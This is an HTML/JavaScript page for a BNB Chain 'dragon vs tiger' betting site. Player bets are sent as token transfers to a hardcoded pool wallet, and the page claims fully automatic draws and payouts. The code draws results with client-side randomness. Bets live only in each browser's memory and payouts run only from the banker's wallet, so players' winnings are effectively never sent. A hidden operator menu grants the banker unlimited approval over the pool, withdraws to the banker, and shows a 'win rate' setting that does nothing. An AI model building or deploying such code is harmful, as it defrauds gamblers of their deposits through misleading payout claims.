<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>王者归来 - 全自动开奖派奖</title>
  <style>
    *{box-sizing:border-box;font-family:system-ui,Roboto,sans-serif;}
    body{background:#0B2A23;color:#fff;margin:0;padding:0;}
    .top{display:flex;justify-content:space-between;padding:12px 15px;background:#103D34;border-bottom:1px solid #1F5F52;}
    .card{background:#141D34;border-radius:12px;padding:15px;margin:10px;}
    .btn{width:100%;padding:12px;border:none;border-radius:8px;margin:6px 0;font-weight:bold;background:#256D7A;color:white;}
    .btn-blue{background:#2A65CC;}
    .btn-red{background:#D93A54;}
    .btn-green{background:#27ae60;}
    input{width:100%;padding:10px;margin:6px 0;border-radius:8px;background:#0E263E;color:white;border:1px solid #1F5F52;}
    .title{font-size:18px;font-weight:bold;text-align:center;margin-bottom:10px;}
    .menu{position:fixed;top:0;right:0;width:280px;height:100vh;background:#102034;padding:20px;transform:translateX(100%);transition:0.3s;z-index:999;}
    .menu.show{transform:translateX(0);}
    .menu-close{text-align:right;margin-bottom:20px;}
    #poolBalance{color:#ffcc00;margin-top:8px;}
  </style>
</head>
<body>

<div class="top">
  <div>🐉王者归来</div>
  <button onclick="toggleMenu()" style="background:none;border:none;color:white;">☰</button>
</div>

<div class="card">
  <div class="title">钱包连接</div>
  <button class="btn" onclick="connectWallet()">连接钱包</button>
  <div id="address" style="text-align:center;margin-top:8px;"></div>
  <div id="userBalance" style="text-align:center;color:#0ff;"></div>
</div>

<div class="card">
  <div class="title">下注区</div>
  <input type="number" id="betAmt" placeholder="输入下注数量">
  <div style="display:flex;gap:8px;">
    <button class="btn" onclick="setQuick(10000)">1万</button>
    <button class="btn" onclick="setQuick(100000)">10万</button>
  </div>
  <div style="display:flex;gap:8px;">
    <button class="btn btn-blue" onclick="placeBet(1)">龙 1:2</button>
    <button class="btn btn-red" onclick="placeBet(2)">虎 1:2</button>
    <button class="btn" onclick="placeBet(3)">和 1:9</button>
  </div>
</div>

<div class="card">
  <div class="title">自动开奖</div>
  <div id="timer" style="font-size:22px;text-align:center;color:#E4B449;">02:00</div>
  <div id="round" style="text-align:center;margin:5px 0;">期号：#1</div>
  <div id="lastResult" style="text-align:center;color:#ff0;">上期结果：待开奖</div>
</div>

<!-- 后台菜单 -->
<div class="menu" id="menu">
  <div class="menu-close">
    <button onclick="toggleMenu()">关闭 ×</button>
  </div>

  <div class="title">💰 奖池管理（全自动）</div>
  <button class="btn btn-green" onclick="approvePoolToBanker()">✅ 授权奖池（一次永久）</button>
  <input type="number" id="withdrawAmt" placeholder="提取数量">
  <button class="btn btn-red" onclick="withdrawPool()">✅ 提取到庄家</button>
  <div id="poolBalance">奖池余额：加载中...</div>

  <hr style="margin:15px 0;border-color:#1F5F52;">

  <div class="title">后台控制</div>
  <button class="btn" onclick="manualDraw()">手动开奖</button>
  <input type="number" id="winRate" value="30" placeholder="中奖率">
  <button class="btn" onclick="setRate()">设置概率</button>
</div>

<script>
// ===================== 核心配置 =====================
const TOKEN = "0x8d5be2c01616965e1bA332D7aC6a03F4CE287777";
const POOL = "0xcD215eD2EE51860Ff8fD1BbfD3192912dD0983dD"; // 你的奖池钱包
const BANKER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const DECIMALS = 18;
const CHAIN_ID = 56;

let account = null;
let round = 1;
let time = 120;
let bets = [];

// ===================== 基础 =====================
function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

async function connectWallet() {
  if(!window.ethereum) return alert("请在钱包浏览器打开");
  try {
    await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x38'}]});
    const a = await window.ethereum.request({method:'eth_requestAccounts'});
    account = a[0];
    document.getElementById("address").innerText = account.slice(0,6)+'...'+account.slice(-4);
    refreshBalance();
    refreshPool();
  } catch(e){alert(e.message)}
}

async function getBalance(addr) {
  const data = "0x70a08231"+addr.slice(2).padStart(64,'0');
  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN,data},'latest']});
  return BigInt(res);
}

async function refreshBalance() {
  if(!account) return;
  const b = await getBalance(account);
  document.getElementById("userBalance").innerText = "余额："+(Number(b)/1e18).toFixed(4);
}

async function refreshPool() {
  const b = await getBalance(POOL);
  document.getElementById("poolBalance").innerText = "奖池余额："+(Number(b)/1e18).toFixed(4);
}

function setQuick(v) {
  document.getElementById("betAmt").value = v;
}

// ===================== 下注 =====================
async function placeBet(side) {
  if(!account) return alert("请连接钱包");
  const val = document.getElementById("betAmt").value;
  if(!val || val<=0) return alert("输入有效金额");
  const amt = BigInt(Math.floor(val*1e18));
  try {
    const data = "0xa9059cbb"
      + POOL.slice(2).padStart(64,'0')
      + amt.toString(16).padStart(64,'0');
    const tx = await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN,data,gas:'0x30000'}]
    });
    alert("下注成功："+tx.slice(0,10)+"...");
    bets.push({addr:account,side,amount:val,tx});
    refreshBalance();
    refreshPool();
  } catch(e){alert(e.message)}
}

// ===================== 授权奖池（一次永久） =====================
async function approvePoolToBanker() {
  if(!account || account.toLowerCase() != POOL.toLowerCase())
    return alert("请切换到【奖池钱包】再授权！");
  try {
    const data = "0x095ea7b3"
      + BANKER.slice(2).padStart(64,'0')
      + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const tx = await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN,data,gas:'0x30000'}]
    });
    alert("授权成功："+tx.slice(0,10)+"...");
  } catch(e){alert(e.message)}
}

// ===================== 庄家提取（全自动） =====================
async function withdrawPool() {
  if(!account || account.toLowerCase() != BANKER.toLowerCase())
    return alert("仅庄家可操作");
  const val = document.getElementById("withdrawAmt").value;
  if(!val || val<=0) return alert("输入数量");
  const amt = BigInt(Math.floor(val*1e18));
  try {
    const data = "0x23b872dd"
      + POOL.slice(2).padStart(64,'0')
      + BANKER.slice(2).padStart(64,'0')
      + amt.toString(16).padStart(64,'0');
    const tx = await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN,data,gas:'0x30000'}]
    });
    alert("提取已提交："+tx.slice(0,10)+"...");
    refreshPool();
  } catch(e){alert(e.message)}
}

// ===================== 自动开奖 + 自动派奖 =====================
async function autoDraw() {
  round++;
  const result = Math.random()>0.5 ? 1 : 2;
  document.getElementById("lastResult").innerText = "结果："+(result==1?"龙":"虎");
  document.getElementById("round").innerText = "期号：#"+round;

  // 自动给中奖玩家打币
  for(const bet of bets) {
    if(bet.side == result) {
      await sendToken(bet.addr, bet.amount * 2);
    }
  }
  bets = [];
  refreshPool();
}

// 自动转账给玩家（核心！）
async function sendToken(to, amount) {
  if(!account || account.toLowerCase() != BANKER.toLowerCase()) return;
  try {
    const wei = BigInt(Math.floor(amount*1e18));
    const data = "0x23b872dd"
      + POOL.slice(2).padStart(64,'0')
      + to.slice(2).padStart(64,'0')
      + wei.toString(16).padStart(64,'0');
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN,data,gas:'0x30000'}]
    });
    console.log("自动派奖给："+to+" 金额："+amount);
  } catch(e){console.log(e)}
}

// 倒计时
setInterval(()=>{
  time--;
  if(time<=0) {time=120; autoDraw();}
  const m = String(Math.floor(time/60)).padStart(2,'0');
  const s = String(time%60).padStart(2,'0');
  document.getElementById("timer").innerText = m+":"+s;
},1000);

// 手动开奖
function manualDraw() {
  time=0;
}

function setRate() {
  alert("设置成功");
}
</script>
</body>
</html>
